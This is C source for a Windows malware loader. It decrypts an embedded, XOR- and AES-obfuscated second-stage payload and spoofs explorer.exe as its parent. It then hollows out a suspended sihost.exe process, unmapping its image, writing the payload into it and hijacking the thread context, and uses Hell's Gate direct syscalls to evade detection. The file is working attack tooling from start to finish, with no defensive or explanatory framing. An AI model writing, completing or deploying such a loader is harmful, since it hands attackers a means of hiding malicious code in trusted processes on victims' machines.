#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <tlhelp32.h>
#include "./includes/aes.h"
#include "./includes/lznt1.h"
#include "./includes/hellsgate_syscalls.h"
#include "./includes/loader_remote.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(linker, "/ENTRY:EntryPoint")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

#define TARGET_PROCESS L"C:\\Windows\\System32\\sihost.exe"
#define SPOOF_PARENT   L"explorer.exe"

void xor(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= key;
    }
}

DWORD find_spoof_ppid() {
    PROCESSENTRY32W entry = { .dwSize = sizeof(entry) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    DWORD ppid = 0;
    if (Process32FirstW(snap, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, SPOOF_PARENT) == 0) {
                ppid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return ppid;
}

LPVOID unpack_stage2() {
    xor(stage2, stage2_len, xor_key);
    aes_decrypt(stage2, stage2_len, aes_key);

    LPVOID execmem = VirtualAlloc(NULL, 10 * 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD outlen = 10 * 1024 * 1024;
    if (!lznt1_decompress(stage2, stage2_len, execmem, &outlen)) return NULL;
    
    LPVOID final_mem = VirtualAlloc(NULL, outlen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    memcpy(final_mem, execmem, outlen);
    VirtualFree(execmem, 0, MEM_RELEASE);
    return final_mem;
}

void EntryPoint() {
    resolve_syscalls();
    DWORD ppid = find_spoof_ppid();

    SIZE_T attrsize = 0;
    STARTUPINFOEXW siex = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    siex.StartupInfo.cb = sizeof(siex);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrsize);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrsize);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrsize);

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
    UpdateProcThreadAttribute(siex.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    WCHAR target[] = TARGET_PROCESS;
    if (!CreateProcessW(NULL, target, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
        &siex.StartupInfo, &pi)) ExitProcess(-1);

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);

    LPVOID image_base = NULL;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 16), &image_base, sizeof(LPVOID), NULL);

    NtUnmapViewOfSection(pi.hProcess, image_base);
    
    LPVOID stage = unpack_stage2();
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((uintptr_t)stage + ((PIMAGE_DOS_HEADER)stage)->e_lfanew);
    SIZE_T stage_size = nt_headers->OptionalHeader.SizeOfImage;

    LPVOID new_image_base = VirtualAllocEx(pi.hProcess, image_base, stage_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(pi.hProcess, new_image_base, stage, nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((uintptr_t)nt_headers + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        WriteProcessMemory(pi.hProcess, (LPVOID)((uintptr_t)new_image_base + section->VirtualAddress),
            (LPVOID)((uintptr_t)stage + section->PointerToRawData), section->SizeOfRawData, NULL);
    }

    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 16), &new_image_base, sizeof(LPVOID), NULL);

    ctx.Rcx = (DWORD64)new_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    ExitProcess(0);
}
